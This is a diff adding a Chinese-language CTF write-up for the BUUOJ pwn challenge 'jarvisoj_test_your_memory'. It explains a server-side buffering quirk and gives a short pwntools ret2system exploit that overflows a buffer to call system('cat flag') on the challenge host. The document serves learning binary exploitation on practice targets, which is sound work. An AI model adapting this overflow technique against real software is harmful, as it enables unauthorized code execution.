@@ -436,6 +436,41 @@ if __name__ == "__main__":
     main()
 ```
 
+### jarvisoj_test_your_memory
+
+[题目链接](https://buuoj.cn/challenges#jarvisoj_test_your_memory)
+
+挺神秘一道题，我一开始还打算把 s2 拼接到 payload 上，但是突然发现这个题目，它的那个靶机没关缓冲区，导致 I/O 缓冲死锁，即远程程序执行了 puts 等打印操作，但文字卡在全缓冲区里没有发出来，靶机一开始就“卡”住等待输入。
+
+所以我们得不到 s2，必须发送 payload 直接成功。
+
+那么直接查 system 和 binsh 吧。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26198
+io = remote(host, port)
+# io = process("./memory")
+elf = ELF("./memory")
+cat_flag = next(elf.search(b"cat flag"))
+system = elf.sym['system']
+main_addr = elf.sym['main']
+
+def main():
+    print("[+] Found 'cat flag' at:",hex(cat_flag))    
+    payload = b'A'*0x17 + p32(system) + p32(main_addr) + p32(cat_flag)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+
 ## 中水区
 
 可能只有主播这种区才会觉得这里是中水区。
